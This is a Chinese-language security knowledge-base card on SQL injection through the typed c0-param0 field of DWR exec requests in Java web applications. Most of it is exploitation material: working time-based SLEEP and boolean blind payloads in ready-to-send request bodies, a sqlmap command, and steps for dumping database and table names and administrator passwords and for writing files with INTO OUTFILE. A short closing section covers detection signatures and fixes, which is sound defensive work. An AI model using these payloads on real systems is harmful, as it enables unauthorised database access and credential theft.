---
id: web-generic-sqli-dwr-typed-param-injection-point
title: DWR 报文体里的注入点：payload 放在 c0-param0 的类型前缀之后，其余字段保持合法
type: scenario
domain: web
path: web/generic/sqli
technique: dwr-typed-param-sqli-injection-point
tags:
- sqli
- dwr
- java
- blind-injection
- time-based
- boolean-based
- sqlmap
- injection-point
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W5
  verified_at: '2026-11-08T14:35:46+08:00'
  notes: '已对照原文与图04/07核对：原始基线报文（callCount=1、c0-scriptName=workflowSync、c0-methodName=getLeaderByOrgId、c0-id=1908_1736498493215、c0-param0=string:、xml=true）与图04 一致；图07 的 sqlmap 结果为 custom POST 布尔盲注 payload (SELECT (CASE WHEN (9351=9351) THEN '''' ELSE (SELECT 8846 UNION SELECT 6660) END)) 与 MySQL >= 5.0.12 时间盲注 (CASE WHEN (3148=3148) THEN SLEEP(5) ELSE 3148 END)、DBMS=MySQL 均一致。小差异(不影响结论)：原文 sqlmap 输出的 payload 是 c0-param0=(CASE...)，未保留 string: 前缀，卡内建议保留前缀属更稳写法。未验证点：未复跑 sqlmap；原文未给受影响版本区间。'
url: /docs/web/generic/sqli/web-generic-sqli-dwr-typed-param-injection-point/
draft: false
kb_aliases:
- DWR SQL 注入
- c0-param0 注入点
- callCount=1 c0-methodName
- DWR 布尔盲注
- DWR 时间盲注 SLEEP
- sqlmap 自定义注入点 DWR
---

## 一句话结论

DWR 的 `exec` 报文不是表单、也不是 JSON，而是 `callCount=1` 起的一组 `c0-*` 键值行；注入点只存在于 `c0-param0=string:<值>` 冒号之后的部分，其余字段（`c0-scriptName`、`c0-methodName`、`c0-id`、`xml=true`）必须保持合法才能让 `DWRServlet` 走到反射调用。把 payload 放进该位置、并把它标成自定义注入点（如 `c0-param0=string:*`），sqlmap 就能识别并跑出布尔/时间盲注，从而绕过「非标准报文体让扫描器直接放弃」这一实际障碍。

## 原理

- DWR 服务端解析是「按行 `key=value`」：`c0-param0` 的值以类型前缀开头（`string:`、`number:`、`boolean:`），冒号后才是真正参数。类型前缀决定了反序列化方式，去掉它或改错类型会让调用在进入业务方法前就失败，因此注入必须保留前缀、只污染冒号后的内容。
- 业务方法的参数随后被拼进 SQL（`getLeaderByOrgId(operProcOrg)` → `bd.getLeaderListByOrgId(operProcOrg)` 内部拼查询），所以 SQL 语法错误/条件真假会通过响应体现：真值时方法正常返回（如 `noleader` 或数据行），假值或 `SLEEP(5)` 时响应为空/延迟。
- 时间盲注可行是因为整条 SQL 在同一连接内执行：`c0-param0=string:(CASE WHEN (3148=3148) THEN SLEEP(5) ELSE 3148 END)` 会让服务端阻塞 5 秒，响应时间可直接作为 oracle；布尔盲注则用 `(SELECT (CASE WHEN (9351=9351) THEN '' ELSE (SELECT 8846 UNION SELECT 6660) END))` 这类表达式让两种分支产生不同结果。
- 报文里 `xml=true` 让 DWR 返回 XML 而不是 JS 回调，便于工具解析；`c0-id` 只要格式像 `<数字>_<时间戳>` 即可，服务端只用它把响应与请求配对，不做校验。
- 之所以容易漏测：通用扫描器默认只认 `application/x-www-form-urlencoded`/JSON，遇到 `text/plain` 的 `c0-*` 自定义体往往识别不到参数；手工指定注入点（`*` 标记）或直接用 `--data` 加 `--headers` 复现原始报文才能打通。

## 触发条件

- 目标存在可匿名（或低权限）调用的 DWR `exec` 端点，且被调方法的参数最终进入 SQL 拼接。
- 方法参数类型为 String（`c0-param0=string:`），这样 payload 可直接以文本注入；数值型也能注，但需保证语法闭合。
- 应用把 SQL 错误吞掉、只体现为「返回空/延迟/不同内容」，因此需要盲注而非报错回显。
- 扫描器/手工工具能把原始报文原样重放（保留 `Content-Type: text/plain` 与全部 `c0-*` 字段）。

## 利用步骤

1. 先发合法值确认端点与方法可用（响应含 `DWREngine._handleResponse` 或 `xml` 结果）。
2. 把 `c0-param0=string:` 之后替换为单引号闭合类 payload，观察是否出现报错/异常/返回变化，判断注入类型（报错、布尔、时间）。
3. 用时间函数验证：`c0-param0=string:(CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END)`，对比响应耗时；再换 `1=2` 确认差异。
4. 把完整原始报文存成文件，用 sqlmap 指定注入点：`-r req.txt --data` 或直接把参数值改成 `*`（如 `c0-param0=string:*`），必要时 `--technique=BT --dbms=mysql`。
5. 逐步跑出库名、表名、管理员口令；若目标高权限，再考虑 `INTO OUTFILE` 写文件或借数据库特性进一步利用。
6. 保存报文模板，便于复测与换目标时复用同一注入点格式。

## PoC

```text
# 合法请求（基线）
callCount=1
c0-scriptName=workflowSync
c0-methodName=getLeaderByOrgId
c0-id=1908_1736498493215
c0-param0=string:
xml=true
```

```text
# 时间盲注：真值分支 SLEEP(5)，响应延迟明显
callCount=1
c0-scriptName=workflowSync
c0-methodName=getLeaderByOrgId
c0-id=1908_1736498493215
c0-param0=string:(CASE WHEN (3148=3148) THEN SLEEP(5) ELSE 3148 END)
xml=true
```

```text
# 布尔盲注：两分支返回不同结果
c0-param0=string:(SELECT (CASE WHEN (9351=9351) THEN '' ELSE (SELECT 8846 UNION SELECT 6660) END))
```

```bash
# 原始报文存为 req.txt（含 POST 行与 Content-Type: text/plain），指定注入点跑 sqlmap
# 把 c0-param0 的值改成 string:* 或直接让 sqlmap 用 --data 与 --headers 复现
sqlmap -r req.txt --technique=BT --dbms=mysql --level=5 --risk=2
```

## 变体与关联

- 变体：多参数方法按 `c0-param1`、`c0-param2` 依次追加，逐个换成 `*` 定位真正的注入参数。
- 变体：`c0-param0=number:` 时 payload 需保持数字语法（用 `0 or ...` 之类），`boolean:` 只能注入表达式的真假分支。
- 变体：返回 JS 回调（`xml` 不为 true）时，用响应长度/内容差异做布尔 oracle；`SLEEP` 被过滤时改用 `BENCHMARK`/笛卡尔积耗时。
- 关联：`[[web-java-framework-dwr-debug-index-exec-unauth-method-invoke]]` 提供枚举方法与构造合法报文的入口，本卡是其上的注入点形态与扫描器打通方法；泛型盲注技巧见 `[[web-generic-sqli-order-by-union-lexicographic-blind]]`。
- 边界：方法内部用预编译/参数化、仅做白名单过滤、或 SQL 层被 WAF 拦 `SLEEP`/`CASE` 关键字时，需要换注入语法或换方法；DWR 端点被鉴权覆盖时需先拿低权限会话。

## 检测与防御

- 检测：`c0-param0` 的值出现 `SLEEP(`、`CASE WHEN`、`UNION`、单引号闭合；同一 `c0-id` 前缀短时间高频请求且响应时长离散；响应出现 SQL 异常堆栈。
- 修复：业务方法内改用预编译/参数化查询，禁止把 DWR 传入的字符串直接拼接；对参数做类型与长度白名单校验。
- 加固：DWR 端点纳入鉴权；对 `exec` 报文做结构校验（字段集合、类型前缀、参数长度上限）；数据库账号最小权限并关闭 `INTO OUTFILE`；WAF 对时间盲注特征与异常响应时长告警。
